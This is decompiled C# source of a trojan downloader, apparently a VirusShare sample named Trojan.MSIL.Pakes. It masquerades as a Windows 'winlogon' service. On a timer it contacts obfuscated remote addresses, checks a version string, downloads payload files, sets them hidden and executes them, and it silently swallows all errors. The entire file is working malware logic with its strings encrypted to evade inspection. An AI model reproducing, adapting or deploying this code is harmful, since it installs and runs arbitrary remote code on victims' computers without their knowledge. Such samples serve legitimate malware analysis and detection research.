// Decompiled with JetBrains decompiler
// Type: winlogon.winlogon
// Assembly: winlogon, Version=6.1.7601.17514, Culture=neutral, PublicKeyToken=null
// MVID: 09E09B77-9177-4EFE-A40E-9AAE7B1E7207
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00002-msil\Trojan.MSIL.Pakes.gm-551279cf0483f4f02f1f984b1f7a2ef9140e912ff28c1b994bba67f783b2663a.exe

using System;
using System.ComponentModel;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Timers;
using u0LUUuLFqGwy5lk05Y;
using u4Ef2TQRL0sKLXWmyn;

namespace winlogon
{
  public class winlogon : ServiceBase
  {
    private Stream UJ5L6cTVu;
    private Stream zK6Gsv7DM;
    private string yTl11b8an;
    private System.Timers.Timer gpGf9NLvX;
    private string zKluXefCN;
    private string Pw9Z9ZIno;
    private IContainer nkCAS9hyI;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public winlogon()
    {
      IrWvp08Vs6OdNtqkIq.yrCer6fzZMGEv();
      this.yTl11b8an = OoTPyZNjUNZ6HYUMxs.zADvjFAod(0);
      this.gpGf9NLvX = new System.Timers.Timer();
      this.zKluXefCN = string.Empty;
      this.Pw9Z9ZIno = string.Empty;
      // ISSUE: explicit constructor call
      base.\u002Ector();
      this.yq8Nli6WX();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void Oj8qDRRZR()
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          this.UJ5L6cTVu = webClient.OpenRead(OoTPyZNjUNZ6HYUMxs.zADvjFAod(42));
          this.zK6Gsv7DM = (Stream) new FileStream(OoTPyZNjUNZ6HYUMxs.zADvjFAod(122), FileMode.Create, FileAccess.Write, FileShare.None);
          byte[] buffer = new byte[2048];
          int count;
          while ((count = this.UJ5L6cTVu.Read(buffer, 0, buffer.Length)) > 0)
            this.zK6Gsv7DM.Write(buffer, 0, count);
        }
        this.UJ5L6cTVu.Close();
        this.zK6Gsv7DM.Close();
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private string X2OSMuh5p()
    {
      try
      {
        StreamReader streamReader = new StreamReader(WebRequest.Create(OoTPyZNjUNZ6HYUMxs.zADvjFAod(164)).GetResponse().GetResponseStream());
        string str1 = string.Empty;
        for (string str2 = streamReader.ReadLine(); str2 != null; str2 = streamReader.ReadLine())
        {
          Console.WriteLine(str2);
          if (str2 != null && str2 != string.Empty)
            str1 = str2;
        }
        streamReader.Close();
        return str1;
      }
      catch
      {
        return OoTPyZNjUNZ6HYUMxs.zADvjFAod(240);
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void CKJ4ug7db()
    {
      try
      {
        using (WebClient webClient = new WebClient())
        {
          string address = this.X2OSMuh5p();
          if (address != OoTPyZNjUNZ6HYUMxs.zADvjFAod(264))
          {
            this.UJ5L6cTVu = webClient.OpenRead(address);
            this.zK6Gsv7DM = (Stream) new FileStream(OoTPyZNjUNZ6HYUMxs.zADvjFAod(288), FileMode.Create, FileAccess.Write, FileShare.None);
            byte[] buffer = new byte[2048];
            int count;
            while ((count = this.UJ5L6cTVu.Read(buffer, 0, buffer.Length)) > 0)
              this.zK6Gsv7DM.Write(buffer, 0, count);
          }
        }
        this.UJ5L6cTVu.Close();
        this.zK6Gsv7DM.Close();
        if (!System.IO.File.Exists(OoTPyZNjUNZ6HYUMxs.zADvjFAod(332)))
          return;
        System.IO.File.SetAttributes(OoTPyZNjUNZ6HYUMxs.zADvjFAod(376), FileAttributes.Hidden);
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void EJFKDtyZS()
    {
      try
      {
        if (!System.IO.File.Exists(OoTPyZNjUNZ6HYUMxs.zADvjFAod(420)))
          return;
        Process.Start(OoTPyZNjUNZ6HYUMxs.zADvjFAod(464));
      }
      catch
      {
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void a9pCXkMXr()
    {
      try
      {
        StreamReader streamReader1 = new StreamReader(WebRequest.Create(OoTPyZNjUNZ6HYUMxs.zADvjFAod(508)).GetResponse().GetResponseStream());
        string empty1 = string.Empty;
        for (string str = streamReader1.ReadLine(); str != null; str = streamReader1.ReadLine())
        {
          Console.WriteLine(str);
          if (str != null && str != string.Empty)
            this.zKluXefCN = str;
        }
        streamReader1.Close();
        StreamReader streamReader2 = System.IO.File.OpenText(this.yTl11b8an);
        string empty2 = string.Empty;
        for (string str = streamReader2.ReadLine(); str != null; str = streamReader2.ReadLine())
        {
          Console.WriteLine(str);
          if (str != null && str != string.Empty)
            this.Pw9Z9ZIno = str;
        }
        streamReader2.Close();
        if (this.zKluXefCN != this.Pw9Z9ZIno)
        {
          this.Oj8qDRRZR();
          this.CKJ4ug7db();
          this.EJFKDtyZS();
        }
        else if (System.IO.File.Exists(OoTPyZNjUNZ6HYUMxs.zADvjFAod(588)))
        {
          this.EJFKDtyZS();
        }
        else
        {
          this.CKJ4ug7db();
          this.EJFKDtyZS();
        }
      }
      catch
      {
        this.EJFKDtyZS();
      }
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void OnStart(string[] args)
    {
      this.gpGf9NLvX.Interval = 300000.0;
      this.gpGf9NLvX.Elapsed += new ElapsedEventHandler(this.UpQbWEaIi);
      this.gpGf9NLvX.Start();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void UpQbWEaIi([In] object obj0, [In] ElapsedEventArgs obj1)
    {
      this.gpGf9NLvX.Stop();
      if (!System.IO.File.Exists(this.yTl11b8an))
      {
        this.Oj8qDRRZR();
        this.CKJ4ug7db();
        this.EJFKDtyZS();
      }
      else
        this.a9pCXkMXr();
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void OnStop() => this.gpGf9NLvX.Stop();

    [MethodImpl(MethodImplOptions.NoInlining)]
    protected override void Dispose(bool disposing)
    {
      if (disposing && this.nkCAS9hyI != null)
        this.nkCAS9hyI.Dispose();
      base.Dispose(disposing);
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void yq8Nli6WX()
    {
      this.nkCAS9hyI = (IContainer) new Container();
      this.ServiceName = OoTPyZNjUNZ6HYUMxs.zADvjFAod(632);
    }
  }
}
